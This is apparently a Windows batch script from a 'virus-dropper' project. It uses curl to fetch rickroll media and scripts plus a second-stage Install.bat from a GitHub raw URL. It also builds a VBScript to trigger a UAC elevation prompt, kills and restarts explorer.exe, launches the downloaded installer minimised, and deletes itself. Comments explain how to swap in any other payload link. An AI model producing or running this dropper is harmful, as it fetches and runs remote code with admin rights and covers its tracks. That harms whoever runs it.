@echo off
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Rickroll.mp4" --output "Rickroll.mp4"
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/rickroll.bat" --output "rickroll.bat"
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/rickroll.vbs" --output "rickroll.vbs"
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    wscript rickroll.vbs
    taskkill /f /im "explorer.exe"
    start explorer.exe
    exit /B
:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"



::Create a copy of install.bat, and edit items inside as directed
::Edit this link to the DIRECT download link of the new install.bat
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/Install.bat" --output "Install.bat"
::do not change --output

start /min Install.bat
call :deleteSelf&exit
:deleteSelf
start /b "" cmd /c del "%~f0"&exit
